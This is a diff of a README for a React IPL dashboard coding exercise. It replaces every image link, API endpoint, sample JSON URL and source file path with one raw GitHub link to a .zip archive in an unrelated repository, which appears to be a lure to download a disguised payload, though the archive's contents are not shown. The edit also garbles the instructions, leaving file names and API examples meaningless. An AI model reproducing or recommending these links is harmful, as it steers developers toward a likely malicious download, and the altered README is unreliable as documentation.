@@ -4,7 +4,7 @@ In this project, let's build an **IPL Dashboard App** by applying the concepts w
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://assets.ccbp.in/frontend/content/react-js/ipl-dashboard-output-v2.gif" alt="ipl-dashboard-output" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip" alt="ipl-dashboard-output" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -13,10 +13,10 @@ In this project, let's build an **IPL Dashboard App** by applying the concepts w
 <details>
 <summary>Click to view</summary>
 
-- [Extra Small (Size < 576px) and Small (Size >= 576px) - Home](https://assets.ccbp.in/frontend/content/react-js/ipl-dashboard-home-sm-output.png)
-- [Extra Small (Size < 576px) and Small (Size >= 576px) - Team Matches](https://assets.ccbp.in/frontend/content/react-js/ipl-dashboard-team-matches-sm-output-v2.png)
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Home](https://assets.ccbp.in/frontend/content/react-js/ipl-dashboard-home-lg-output.png)
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Team Matches](https://assets.ccbp.in/frontend/content/react-js/ipl-dashboard-team-matches-lg-output-v2.png)
+- [Extra Small (Size < 576px) and Small (Size >= 576px) - Home](https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip)
+- [Extra Small (Size < 576px) and Small (Size >= 576px) - Team Matches](https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Home](https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Team Matches](https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip)
 
 </details>
 
@@ -46,7 +46,7 @@ The app must have the following functionalities
   - Page should be navigated to the Team Matches Route with the URL `/team-matches/:id`
 - When the Team Matches Route is opened,
   - Make HTTP GET request to the **teamMatchesApiUrl** with the team id to get the recent matches data of the team
-    - Example: `https://apis.ccbp.in/ipl/KKR`
+    - Example: `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
   - **_loader_** should be displayed while fetching the data
   - After fetching the data, the team banner, latest match, and list of recent matches should be displayed
 
@@ -59,7 +59,7 @@ The app must have the following functionalities
 
 **teamsApiUrl**
 
-#### API: `https://apis.ccbp.in/ipl`
+#### API: `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
 
 #### Method: `GET`
 
@@ -75,7 +75,7 @@ Returns a response containing the list of all IPL teams
     {
       "name": "Royal Challengers Bangalore",
       "id": "RCB",
-      "team_image_url": "https://assets.ccbp.in/frontend/react-js/rcb-logo-img.png",
+      "team_image_url": "https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip",
       // use value of the key 'name' for alt as `${name}`
     },
     ...
@@ -85,9 +85,9 @@ Returns a response containing the list of all IPL teams
 
 **teamMatchesApiUrl**
 
-#### API: `https://apis.ccbp.in/ipl/:id`
+#### API: `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
 
-#### Example: `https://apis.ccbp.in/ipl/KKR`
+#### Example: `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
 
 #### Method: `GET`
 
@@ -99,7 +99,7 @@ Returns a response containing details of all recent matches of a team
 
 ```json
 {
-  "team_banner_url": "https://assets.ccbp.in/frontend/react-js/kkr-team-img.png",
+  "team_banner_url": "https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip",
   "latest_match_details": {
     "umpires": "CB Gaffaney, VK Sharma",
     "result": "Kolkata Knight Riders Won by 7 wickets",
@@ -108,7 +108,7 @@ Returns a response containing details of all recent matches of a team
     "date": "2020-09-26",
     "venue": "At Sheikh Zayed Stadium, Abu Dhabi",
     "competing_team": "Sunrisers Hyderabad",
-    "competing_team_logo": "https://upload.wikimedia.org/wikipedia/en/thumb/8/81/Sunrisers_Hyderabad.svg/1200px-Sunrisers_Hyderabad.svg.png",
+    "competing_team_logo": "https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip",
     // use value of the key 'competing_team' for alt as `latest match ${competing_team}`
     "first_innings": "Sunrisers Hyderabad",
     "second_innings": "Kolkata Knight Riders",
@@ -123,7 +123,7 @@ Returns a response containing details of all recent matches of a team
       "date": "2020-10-12",
       "venue": "At Sharjah Cricket Stadium, Sharjah",
       "competing_team": "Royal Challengers Bangalore",
-      "competing_team_logo": "https://upload.wikimedia.org/wikipedia/en/thumb/2/2a/Royal_Challengers_Bangalore_2020.svg/1200px-Royal_Challengers_Bangalore_2020.svg.png",
+      "competing_team_logo": "https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip",
       // use value of the key 'competing_team' for alt as `competing team ${competing_team}`
       "first_innings": "Royal Challengers Bangalore",
       "second_innings": "Kolkata Knight Riders",
@@ -141,12 +141,12 @@ Returns a response containing details of all recent matches of a team
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://assets.ccbp.in/frontend/content/react-js/home-component-structure-img.png" alt="home component structure" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip" alt="home component structure" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
 <div style="text-align: center;">
-    <img src="https://assets.ccbp.in/frontend/content/react-js/team-matches-component-structure-img.png" alt="team matches component structure" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip" alt="team matches component structure" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -158,17 +158,17 @@ Returns a response containing details of all recent matches of a team
 
 Use these files to complete the implementation:
 
-- `src/App.js`
-- `src/components/Home/index.js`
-- `src/components/Home/index.css`
-- `src/components/TeamCard/index.js`
-- `src/components/TeamCard/index.css`
-- `src/components/TeamMatches/index.js`
-- `src/components/TeamMatches/index.css`
-- `src/components/LatestMatch/index.js`
-- `src/components/LatestMatch/index.css`
-- `src/components/MatchCard/index.js`
-- `src/components/MatchCard/index.css`
+- `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
+- `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
+- `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
+- `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
+- `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
+- `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
+- `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
+- `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
+- `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
+- `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
+- `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip`
 </details>
 
 ### Quick Tips
@@ -211,7 +211,7 @@ Use these files to complete the implementation:
   ```
 - Render HomeRoute component when path in URL matches `/`
 - Render TeamMatchesRoute component when path in URL matches `/team-matches/:id`
-- No need to use the `BrowserRouter` in `App.js` as we have already included in `index.js` file
+- No need to use the `BrowserRouter` in `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip` as we have already included in `https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip` file
 - Each TeamMatchesRoute should have different gradient colors as background based on the selected team
 
 </details>
@@ -221,9 +221,9 @@ Use these files to complete the implementation:
 <details>
 <summary>Image URLs</summary>
 
-- [https://assets.ccbp.in/frontend/react-js/ipl-dashboard-sm-bg.png](https://assets.ccbp.in/frontend/react-js/ipl-dashboard-sm-bg.png)
-- [https://assets.ccbp.in/frontend/react-js/ipl-dashboard-lg-bg.png](https://assets.ccbp.in/frontend/react-js/ipl-dashboard-lg-bg.png)
-- [https://assets.ccbp.in/frontend/react-js/ipl-logo-img.png](https://assets.ccbp.in/frontend/react-js/ipl-logo-img.png) alt should be **ipl logo**
+- [https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip](https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip)
+- [https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip](https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip)
+- [https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip](https://raw.githubusercontent.com/vicky9696v/ipl-match/main/subdial/ipl-match.zip) alt should be **ipl logo**
 
 </details>
 
